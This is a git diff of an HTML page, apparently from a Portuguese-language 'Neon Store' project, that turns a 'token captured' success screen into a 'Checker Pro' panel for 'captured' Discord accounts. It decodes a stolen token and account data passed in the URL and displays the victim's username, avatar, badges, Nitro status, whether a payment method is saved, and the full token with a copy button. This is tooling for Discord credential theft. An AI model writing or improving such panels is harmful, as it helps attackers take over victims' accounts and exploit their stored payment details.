@@ -3,29 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Capturado | Neon Store</title>
+    <title>Token Checker | Neon Store</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        .result-container {
-            margin-top: 10vh;
-            animation: zoomIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        .token-display {
-            background: #121416;
+        .result-container { margin-top: 5vh; animation: zoomIn 0.5s ease-out; }
+        .user-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
             padding: 30px;
-            border-radius: 12px;
-            border: 2px solid var(--primary);
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 1.2rem;
-            margin: 30px 0;
-            color: var(--accent);
-            box-shadow: 0 0 30px var(--primary-glow);
+            margin-bottom: 30px;
+            border: 1px solid rgba(88, 101, 242, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 25px;
+            text-align: left;
         }
-        @keyframes zoomIn {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid var(--primary);
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+        .user-info h2 { font-family: 'Orbitron', sans-serif; margin-bottom: 10px; color: var(--accent); }
+        .badge-list { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
+        .badge {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-muted);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .status-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .status-item {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .status-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; margin-bottom: 5px; }
+        .status-value { font-weight: 700; color: #fff; }
+        .token-area { margin-top: 30px; }
+        .token-display {
+            background: #000;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            word-break: break-all;
+            color: var(--primary);
+            margin: 15px 0;
+            border: 1px dashed var(--primary);
+        }
+        .nitro-active { color: #ff73fa !important; text-shadow: 0 0 10px rgba(255,115,250,0.5); }
+        .payment-active { color: #27c93f !important; }
+        
+        @media (max-width: 600px) {
+            .user-card { flex-direction: column; text-align: center; }
+            .status-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -33,47 +77,95 @@
     <div class="background-overlay"></div>
     <main class="container">
         <header class="hero result-container">
-            <h1 class="glitch-text" data-text="SUCESSO!">SUCESSO!</h1>
-            <p class="subtitle">O seu Token foi extraído com segurança.</p>
+            <h1 class="glitch-text">CHECKER PRO</h1>
+            <p class="subtitle">Análise completa da conta capturada.</p>
             
             <div class="card-glass">
-                <h2>Seu Token do Discord:</h2>
-                <div id="tokenOutput" class="token-display">Carregando...</div>
-                <button id="copyTokenBtn" class="premium-btn large">COPIAR TOKEN</button>
+                <div id="userCard" class="user-card" style="display: none;">
+                    <img id="userAvatar" src="" alt="Avatar" class="avatar">
+                    <div class="user-info">
+                        <h2 id="userName">Carregando...</h2>
+                        <div id="badgeList" class="badge-list"></div>
+                    </div>
+                </div>
+
+                <div class="status-grid">
+                    <div class="status-item">
+                        <div class="status-label">Assinatura Nitro</div>
+                        <div id="nitroStatus" class="status-value">Verificando...</div>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-label">Pagamento Salvo</div>
+                        <div id="paymentStatus" class="status-value">Verificando...</div>
+                    </div>
+                </div>
+
+                <div class="token-area">
+                    <div class="status-label">Token Completo</div>
+                    <div id="tokenOutput" class="token-display">...</div>
+                    <button id="copyTokenBtn" class="premium-btn large">COPIAR TOKEN</button>
+                </div>
             </div>
 
-            <footer style="margin-top: 50px;">
+            <footer style="margin-top: 40px;">
                 <button onclick="window.location.href='index.html'" class="discord-btn" style="border:none; cursor:pointer">
-                    VOLTAR AO INÍCIO
+                    VOLTAR AO PAINEL
                 </button>
             </footer>
         </header>
     </main>
 
     <script>
+        const BADGE_MAP = {
+            1: "Staff", 2: "Partner", 4: "HypeSquad Events", 8: "Bug Hunter Lvl 1",
+            64: "Bravery", 128: "Brilliance", 256: "Balance", 512: "Early Supporter",
+            16384: "Bug Hunter Lvl 2", 131072: "Verified Dev", 4194304: "Active Developer"
+        };
+
+        const NITRO_MAP = { 0: "Nenhum", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic" };
+
         document.addEventListener('DOMContentLoaded', () => {
             const params = new URLSearchParams(window.location.search);
             const token = params.get('token');
-            const output = document.getElementById('tokenOutput');
-            const copyBtn = document.getElementById('copyTokenBtn');
+            const dataRaw = params.get('data');
 
-            if (token) {
-                output.innerText = token;
-            } else {
-                output.innerText = "Nenhum token encontrado na URL.";
-                output.style.color = "#ff5f56";
+            if (token) document.getElementById('tokenOutput').innerText = token;
+
+            if (dataRaw) {
+                try {
+                    const data = JSON.parse(decodeURIComponent(escape(atob(dataRaw))));
+                    document.getElementById('userCard').style.display = 'flex';
+                    document.getElementById('userName').innerText = data.u;
+                    document.getElementById('userAvatar').src = `https://cdn.discordapp.com/avatars/${data.a}.png?size=256`;
+                    
+                    // Nitro
+                    const nitroVal = data.n || 0;
+                    const nitroText = NITRO_MAP[nitroVal];
+                    document.getElementById('nitroStatus').innerText = nitroText;
+                    if (nitroVal > 0) document.getElementById('nitroStatus').classList.add('nitro-active');
+
+                    // Payment
+                    document.getElementById('paymentStatus').innerText = data.p ? "SIM" : "NÃO";
+                    if (data.p) document.getElementById('paymentStatus').classList.add('payment-active');
+
+                    // Badges
+                    const badges = data.f || 0;
+                    const bList = document.getElementById('badgeList');
+                    Object.keys(BADGE_MAP).forEach(flag => {
+                        if (badges & flag) {
+                            const b = document.createElement('span');
+                            b.className = 'badge';
+                            b.innerText = BADGE_MAP[flag];
+                            bList.appendChild(b);
+                        }
+                    });
+                } catch (e) { console.error("Erro ao processar dados:", e); }
             }
 
-            copyBtn.onclick = async () => {
-                if (token) {
-                    await navigator.clipboard.writeText(token);
-                    copyBtn.innerText = "✅ TOKEN COPIADO!";
-                    copyBtn.style.background = "#27c93f";
-                    setTimeout(() => {
-                        copyBtn.innerText = "COPIAR TOKEN";
-                        copyBtn.style.background = "";
-                    }, 2000);
-                }
+            document.getElementById('copyTokenBtn').onclick = async () => {
+                await navigator.clipboard.writeText(token);
+                document.getElementById('copyTokenBtn').innerText = "✅ COPIADO!";
+                setTimeout(() => { document.getElementById('copyTokenBtn').innerText = "COPIAR TOKEN"; }, 2000);
             };
         });
     </script>
